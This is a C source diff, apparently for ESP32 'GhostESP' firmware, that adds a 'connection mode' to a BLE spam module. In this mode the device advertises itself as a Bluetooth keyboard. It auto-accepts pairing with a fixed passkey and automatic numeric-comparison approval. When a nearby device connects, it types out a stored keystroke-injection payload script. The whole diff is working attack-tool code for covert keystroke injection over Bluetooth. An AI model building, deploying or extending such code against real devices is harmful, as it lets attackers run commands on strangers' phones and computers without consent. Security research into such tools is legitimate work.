@@ -14,15 +14,84 @@
 #include "managers/ghostchi_manager.h"
 #include "managers/rgb_manager.h"
 #include "managers/status_display_manager.h"
+#include "managers/hid_script_parser.h"
 #include "core/glog.h"
 #include "esp_random.h"
+#include "esp_hidd_api.h"
 #include "freertos/semphr.h"
 #include "host/ble_gap.h"
 #include "host/ble_hs.h"
+#include "host/ble_sm.h"
+#include "host/ble_store.h"
+#include "host/ble_uuid.h"
+#include "services/gap/ble_svc_gap.h"
 #include "nimble/ble.h"
 #include <string.h>
 
 extern RGBManager_t rgb_manager;
+
+// ============================================================================
+// HID Keyboard Report Descriptor (for connection mode)
+// ============================================================================
+
+static const uint8_t ble_spam_keyboard_report_map[] = {
+    0x05, 0x01,       /* Usage Page (Generic Desktop) */
+    0x09, 0x06,       /* Usage (Keyboard) */
+    0xA1, 0x01,       /* Collection (Application) */
+    0x85, 0x01,       /*   Report ID (1) */
+    0x05, 0x07,       /*   Usage Page (Keyboard) */
+    0x19, 0xE0,       /*   Usage Minimum (Left Control) */
+    0x29, 0xE7,       /*   Usage Maximum (Right GUI) */
+    0x15, 0x00,       /*   Logical Minimum (0) */
+    0x25, 0x01,       /*   Logical Maximum (1) */
+    0x75, 0x01,       /*   Report Size (1) */
+    0x95, 0x08,       /*   Report Count (8) */
+    0x81, 0x02,       /*   Input (Data, Variable, Absolute) */
+    0x95, 0x01,       /*   Report Count (1) */
+    0x75, 0x08,       /*   Report Size (8) */
+    0x81, 0x01,       /*   Input (Constant) */
+    0x95, 0x06,       /*   Report Count (6) */
+    0x75, 0x08,       /*   Report Size (8) */
+    0x15, 0x00,       /*   Logical Minimum (0) */
+    0x25, 0x65,       /*   Logical Maximum (101) */
+    0x05, 0x07,       /*   Usage Page (Keyboard) */
+    0x19, 0x00,       /*   Usage Minimum (0) */
+    0x29, 0x65,       /*   Usage Maximum (101) */
+    0x81, 0x00,       /*   Input (Data, Array) */
+    0x05, 0x08,       /*   Usage Page (LEDs) */
+    0x19, 0x01,       /*   Usage Minimum (Num Lock) */
+    0x29, 0x05,       /*   Usage Maximum (Kana) */
+    0x75, 0x01,       /*   Report Size (1) */
+    0x95, 0x05,       /*   Report Count (5) */
+    0x91, 0x02,       /*   Output (Data, Variable, Absolute) */
+    0x95, 0x01,       /*   Report Count (1) */
+    0x75, 0x03,       /*   Report Size (3) */
+    0x91, 0x01,       /*   Output (Constant) */
+    0xC0              /* End Collection */
+};
+
+static esp_hid_raw_report_map_t ble_spam_report_maps[] = {
+    {
+        .data = ble_spam_keyboard_report_map,
+        .len = sizeof(ble_spam_keyboard_report_map),
+    },
+};
+
+// ============================================================================
+// State variables for HID keyboard and connection mode
+// ============================================================================
+
+static volatile bool spam_accept_connections = false;
+static volatile bool spam_hid_enabled = false;
+static volatile uint16_t spam_conn_handle = BLE_HS_CONN_HANDLE_NONE;
+static volatile bool spam_connected = false;
+static volatile bool spam_notify_ready = false;
+static esp_hidd_dev_t *spam_hid_dev = NULL;
+static SemaphoreHandle_t spam_hid_report_lock = NULL;
+static TaskHandle_t spam_payload_task = NULL;
+static char *spam_payload_script = NULL;
+static SemaphoreHandle_t spam_payload_done_sem = NULL;
+static volatile bool spam_payload_cancel = false;
 
 // ============================================================================
 // Apple Continuity — device models and action types
@@ -575,6 +644,383 @@ static void spam_log_timer_cb(TimerHandle_t xTimer) {
 }
 
 // ============================================================================
+// HID Keyboard functions for connection mode
+// ============================================================================
+
+static bool spam_hid_send_report(const uint8_t report[8]) {
+    if (!report || !spam_hid_enabled || !spam_hid_dev || !spam_connected || !spam_notify_ready) {
+        return false;
+    }
+
+    if (spam_hid_report_lock) {
+        xSemaphoreTake(spam_hid_report_lock, portMAX_DELAY);
+    }
+
+    esp_err_t ret = esp_hidd_dev_input_set(spam_hid_dev, 0, 1, (uint8_t *)report, 8);
+    if (ret != ESP_OK) {
+        vTaskDelay(pdMS_TO_TICKS(20));
+        ret = esp_hidd_dev_input_set(spam_hid_dev, 0, 1, (uint8_t *)report, 8);
+        if (ret != ESP_OK) {
+            glog("BLE Spam HID: Failed to send report: %s\n", esp_err_to_name(ret));
+        }
+    }
+
+    if (spam_hid_report_lock) {
+        xSemaphoreGive(spam_hid_report_lock);
+    }
+
+    return ret == ESP_OK;
+}
+
+static bool spam_hid_send_key(uint8_t modifiers, uint8_t keycode, void *ctx) {
+    (void)ctx;
+    uint8_t report[8] = {modifiers, 0, keycode, 0, 0, 0, 0, 0};
+    if (!spam_hid_send_report(report)) {
+        return false;
+    }
+    vTaskDelay(pdMS_TO_TICKS(30));
+    return !spam_payload_cancel;
+}
+
+static bool spam_hid_send_string(const char *text, size_t len, void *ctx) {
+    (void)ctx;
+    if (!text) {
+        return false;
+    }
+
+    for (size_t i = 0; i < len; ++i) {
+        if (spam_payload_cancel) {
+            return false;
+        }
+        uint8_t keycode, modifier;
+        if (!hid_ascii_to_keycode(text[i], &keycode, &modifier)) {
+            continue;
+        }
+        if (!spam_hid_send_key(modifier, keycode, NULL)) {
+            return false;
+        }
+        
+        uint8_t release_report[8] = {0};
+        if (!spam_hid_send_report(release_report)) {
+            return false;
+        }
+    }
+    return true;
+}
+
+static void spam_hid_delay(uint32_t ms, void *ctx) {
+    (void)ctx;
+    while (ms > 0 && !spam_payload_cancel) {
+        uint32_t chunk = ms > 100 ? 100 : ms;
+        vTaskDelay(pdMS_TO_TICKS(chunk));
+        ms -= chunk;
+    }
+}
+
+static bool spam_hid_release_keys(void *ctx) {
+    (void)ctx;
+    const uint8_t release_report[8] = {0};
+    return spam_hid_send_report(release_report);
+}
+
+static bool spam_hid_transport_cancelled(void *ctx) {
+    (void)ctx;
+    return spam_payload_cancel;
+}
+
+static const hid_transport_t spam_hid_transport = {
+    .send_key = spam_hid_send_key,
+    .send_string = spam_hid_send_string,
+    .delay = spam_hid_delay,
+    .release_keys = spam_hid_release_keys,
+    .is_cancelled = spam_hid_transport_cancelled,
+    .ctx = NULL,
+};
+
+static void spam_payload_task_fn(void *arg) {
+    (void)arg;
+    
+    spam_payload_cancel = false;
+    glog("BLE Spam: Executing payload script...\n");
+    
+    if (spam_payload_script) {
+        hid_script_execute(spam_payload_script, &spam_hid_transport);
+    }
+    
+    spam_hid_release_keys(NULL);
+    glog("BLE Spam: Payload execution complete\n");
+    
+    if (spam_payload_done_sem) {
+        xSemaphoreGive(spam_payload_done_sem);
+    }
+    
+    spam_payload_task = NULL;
+    vTaskDelete(NULL);
+}
+
+static void spam_start_payload_if_ready(void) {
+    if (!spam_payload_script || spam_payload_task || !spam_connected || !spam_notify_ready) {
+        return;
+    }
+    
+    spam_payload_cancel = false;
+    BaseType_t res = xTaskCreate(spam_payload_task_fn, "ble_spam_payload", 4096, NULL, 5, &spam_payload_task);
+    if (res != pdPASS) {
+        glog("BLE Spam: Failed to create payload task\n");
+        spam_payload_task = NULL;
+    }
+}
+
+static void spam_hid_event_cb(void *arg, esp_event_base_t event_base,
+                              int32_t event_id, void *event_data) {
+    (void)arg;
+    (void)event_base;
+    (void)event_data;
+    if (event_id == ESP_HIDD_DISCONNECT_EVENT && spam_payload_task) {
+        spam_payload_cancel = true;
+    }
+}
+
+static int spam_gap_event_cb(struct ble_gap_event *event, void *arg);
+
+static bool spam_start_ble_hid_advertising(void) {
+    if (!spam_running || !spam_hid_enabled) {
+        return false;
+    }
+    
+    if (ble_gap_adv_active()) {
+        ble_gap_adv_stop();
+        vTaskDelay(pdMS_TO_TICKS(20));
+    }
+
+    uint8_t own_addr_type;
+    int rc = ble_hs_id_infer_auto(0, &own_addr_type);
+    if (rc != 0) {
+        return false;
+    }
+
+    // Advertise as HID keyboard
+    static const ble_uuid16_t hid_uuid = BLE_UUID16_INIT(0x1812);
+    struct ble_hs_adv_fields fields;
+    memset(&fields, 0, sizeof(fields));
+    fields.flags = BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP;
+    fields.appearance = ESP_HID_APPEARANCE_KEYBOARD;
+    fields.appearance_is_present = 1;
+    fields.tx_pwr_lvl_is_present = 1;
+    fields.tx_pwr_lvl = BLE_HS_ADV_TX_PWR_LVL_AUTO;
+    fields.uuids16 = &hid_uuid;
+    fields.num_uuids16 = 1;
+    fields.uuids16_is_complete = 1;
+
+    rc = ble_gap_adv_set_fields(&fields);
+    if (rc != 0) {
+        glog("BLE Spam: Failed to set adv fields: %d\n", rc);
+        return false;
+    }
+
+    struct ble_hs_adv_fields response;
+    memset(&response, 0, sizeof(response));
+    response.name = (const uint8_t *)"GhostESP-HID";
+    response.name_len = 12;
+    response.name_is_complete = 1;
+    rc = ble_gap_adv_rsp_set_fields(&response);
+    if (rc != 0) {
+        glog("BLE Spam: Failed to set scan response: %d\n", rc);
+        return false;
+    }
+
+    struct ble_gap_adv_params params;
+    memset(&params, 0, sizeof(params));
+    params.conn_mode = BLE_GAP_CONN_MODE_UND;  // Allow connections
+    params.disc_mode = BLE_GAP_DISC_MODE_GEN;
+    
+    rc = ble_gap_adv_start(own_addr_type, NULL, BLE_HS_FOREVER, &params, spam_gap_event_cb, NULL);
+    if (rc != 0) {
+        glog("BLE Spam: Failed to start HID advertising: %d\n", rc);
+        return false;
+    }
+    
+    return true;
+}
+
+static int spam_gap_event_cb(struct ble_gap_event *event, void *arg) {
+    (void)arg;
+    if (!event) {
+        return 0;
+    }
+
+    switch (event->type) {
+        case BLE_GAP_EVENT_CONNECT:
+            if (event->connect.status == 0) {
+                spam_conn_handle = event->connect.conn_handle;
+                spam_connected = true;
+                spam_notify_ready = false;
+                glog("BLE Spam: Device connected (handle=%u)\n", event->connect.conn_handle);
+                
+                // Initiate security
+                int sec_rc = ble_gap_security_initiate(event->connect.conn_handle);
+                if (sec_rc != 0) {
+                    glog("BLE Spam: Security initiate failed: %d\n", sec_rc);
+                }
+            } else {
+                glog("BLE Spam: Connect attempt failed: %d\n", event->connect.status);
+                if (spam_running && spam_accept_connections) {
+                    spam_start_ble_hid_advertising();
+                }
+            }
+            break;
+
+        case BLE_GAP_EVENT_DISCONNECT:
+            glog("BLE Spam: Device disconnected, reason=%d\n", event->disconnect.reason);
+            if (spam_conn_handle == BLE_HS_CONN_HANDLE_NONE ||
+                event->disconnect.conn.conn_handle == spam_conn_handle) {
+                spam_conn_handle = BLE_HS_CONN_HANDLE_NONE;
+                spam_connected = false;
+                spam_notify_ready = false;
+                if (spam_payload_task) {
+                    spam_payload_cancel = true;
+                }
+                if (spam_running && spam_accept_connections) {
+                    spam_start_ble_hid_advertising();
+                }
+            }
+            break;
+
+        case BLE_GAP_EVENT_SUBSCRIBE:
+            if (spam_connected && event->subscribe.conn_handle == spam_conn_handle) {
+                spam_notify_ready = event->subscribe.cur_notify != 0;
+                glog("BLE Spam: HID notify %s\n", spam_notify_ready ? "enabled" : "disabled");
+                if (spam_notify_ready) {
+                    spam_start_payload_if_ready();
+                }
+            }
+            break;
+
+        case BLE_GAP_EVENT_ENC_CHANGE:
+            glog("BLE Spam: Encryption change: %s\n", 
+                 event->enc_change.status == 0 ? "encrypted" : "not encrypted");
+            break;
+
+        case BLE_GAP_EVENT_REPEAT_PAIRING:
+            glog("BLE Spam: Repeat pairing - dropping stale bond\n");
+            {
+                struct ble_gap_conn_desc desc;
+                if (ble_gap_conn_find(event->repeat_pairing.conn_handle, &desc) == 0) {
+                    (void)ble_store_util_delete_peer(&desc.peer_id_addr);
+                }
+            }
+            return BLE_GAP_REPEAT_PAIRING_RETRY;
+
+        case BLE_GAP_EVENT_PASSKEY_ACTION:
+            glog("BLE Spam: Passkey action %u\n", event->passkey.params.action);
+            {
+                struct ble_sm_io pkey = {0};
+                if (event->passkey.params.action == BLE_SM_IOACT_DISP) {
+                    pkey.action = event->passkey.params.action;
+                    pkey.passkey = 123456;
+                    (void)ble_sm_inject_io(event->passkey.conn_handle, &pkey);
+                } else if (event->passkey.params.action == BLE_SM_IOACT_NUMCMP) {
+                    pkey.action = event->passkey.params.action;
+                    pkey.numcmp_accept = 1;
+                    (void)ble_sm_inject_io(event->passkey.conn_handle, &pkey);
+                } else if (event->passkey.params.action == BLE_SM_IOACT_OOB) {
+                    pkey.action = event->passkey.params.action;
+                    memset(pkey.oob, 0, sizeof(pkey.oob));
+                    (void)ble_sm_inject_io(event->passkey.conn_handle, &pkey);
+                } else if (event->passkey.params.action == BLE_SM_IOACT_INPUT) {
+                    pkey.action = event->passkey.params.action;
+                    pkey.passkey = 123456;
+                    (void)ble_sm_inject_io(event->passkey.conn_handle, &pkey);
+                }
+            }
+            break;
+
+        case BLE_GAP_EVENT_NOTIFY_TX:
+            if (event->notify_tx.status != 0) {
+                glog("BLE Spam: Notify TX failed, status=%d\n", event->notify_tx.status);
+            }
+            break;
+
+        case BLE_GAP_EVENT_MTU:
+            break;
+
+        default:
+            break;
+    }
+    return 0;
+}
+
+static esp_err_t spam_hid_profile_init(void *arg) {
+    (void)arg;
+    spam_hid_enabled = false;
+    spam_connected = false;
+    spam_notify_ready = false;
+    spam_conn_handle = BLE_HS_CONN_HANDLE_NONE;
+
+    if (spam_hid_report_lock == NULL) {
+        spam_hid_report_lock = xSemaphoreCreateMutex();
+    }
+
+    esp_hid_device_config_t config = {
+        .vendor_id = 0x303A,
+        .product_id = 0x4002,
+        .version = 0x0100,
+        .device_name = "GhostESP-HID",
+        .manufacturer_name = "GhostESP",
+        .serial_number = "BLE-Spam-HID",
+        .report_maps = ble_spam_report_maps,
+        .report_maps_len = 1,
+    };
+
+    esp_err_t ret = esp_hidd_dev_init(&config, ESP_HID_TRANSPORT_BLE,
+                                      spam_hid_event_cb, &spam_hid_dev);
+    if (ret != ESP_OK) {
+        glog("BLE Spam: HID initialization failed: %s\n", esp_err_to_name(ret));
+        return ret;
+    }
+
+    if (ble_svc_gap_device_name_set("GhostESP-HID") != 0) {
+        glog("BLE Spam: Unable to set GAP device name\n");
+        return ESP_FAIL;
+    }
+
+    spam_hid_enabled = true;
+    return ESP_OK;
+}
+
+static void spam_hid_profile_cleanup(void *arg) {
+    (void)arg;
+    spam_payload_cancel = true;
+    
+    if (spam_payload_task) {
+        if (spam_payload_done_sem) {
+            if (xSemaphoreTake(spam_payload_done_sem, pdMS_TO_TICKS(500)) != pdTRUE) {
+                vTaskDelete(spam_payload_task);
+            }
+        }
+        spam_payload_task = NULL;
+    }
+
+    spam_hid_release_keys(NULL);
+    spam_hid_enabled = false;
+    spam_connected = false;
+    spam_notify_ready = false;
+
+    if (ble_gap_adv_active()) {
+        ble_gap_adv_stop();
+    }
+    if (spam_conn_handle != BLE_HS_CONN_HANDLE_NONE) {
+        ble_gap_terminate(spam_conn_handle, BLE_ERR_REM_USER_CONN_TERM);
+        spam_conn_handle = BLE_HS_CONN_HANDLE_NONE;
+    }
+
+    if (spam_hid_dev) {
+        esp_hidd_dev_deinit(spam_hid_dev);
+        spam_hid_dev = NULL;
+    }
+}
+
+// ============================================================================
 // Main spam task
 // ============================================================================
 
@@ -582,6 +1028,15 @@ static void spam_task(void *arg) {
     (void)arg;
 
     while (spam_running) {
+        // --- If in connection mode, use HID advertising instead ---
+        if (spam_accept_connections && spam_hid_enabled) {
+            if (!ble_gap_adv_active()) {
+                spam_start_ble_hid_advertising();
+            }
+            vTaskDelay(pdMS_TO_TICKS(100));
+            continue;
+        }
+
         // --- Stop any active advertisement ---
         if (ble_gap_adv_active()) {
             ble_gap_adv_stop();
@@ -767,6 +1222,11 @@ void ble_spam_start(ble_spam_type_t type) {
         return;
     }
 
+    // Initialize HID if connection mode is enabled
+    if (spam_accept_connections && spam_payload_script) {
+        ble_init_with_pre_host(spam_hid_profile_init, spam_hid_profile_cleanup, NULL);
+    }
+
     current_spam_type = type;
     spam_adv_count    = 0;
     spam_running      = true;
@@ -791,7 +1251,8 @@ void ble_spam_start(ble_spam_type_t type) {
         esp_timer_start_periodic(spam_log_timer, (uint64_t)spam_log_interval_ms * 1000);
     }
 
-    glog("BLE Spam started (%s)\n", spam_type_to_name(type));
+    glog("BLE Spam started (%s)%s\n", spam_type_to_name(type), 
+         spam_accept_connections ? " [Connection Mode]" : "");
     status_display_show_status("BLE Spam On");
 }
 
@@ -832,4 +1293,36 @@ void ble_spam_stop(void) {
 
 bool ble_spam_is_running(void) {
     return spam_running;
+}
+
+bool ble_spam_set_payload(const char *script) {
+    if (!script) {
+        if (spam_payload_script) {
+            free(spam_payload_script);
+            spam_payload_script = NULL;
+        }
+        return true;
+    }
+
+    // Free old script if exists
+    if (spam_payload_script) {
+        free(spam_payload_script);
+    }
+
+    // Allocate and copy new script
+    size_t len = strlen(script) + 1;
+    spam_payload_script = malloc(len);
+    if (!spam_payload_script) {
+        glog("BLE Spam: Failed to allocate payload script memory\n");
+        return false;
+    }
+
+    memcpy(spam_payload_script, script, len);
+    glog("BLE Spam: Payload script set (%zu bytes)\n", len);
+    return true;
+}
+
+void ble_spam_set_accept_connections(bool enable) {
+    spam_accept_connections = enable;
+    glog("BLE Spam: Connection mode %s\n", enable ? "enabled" : "disabled");
 }
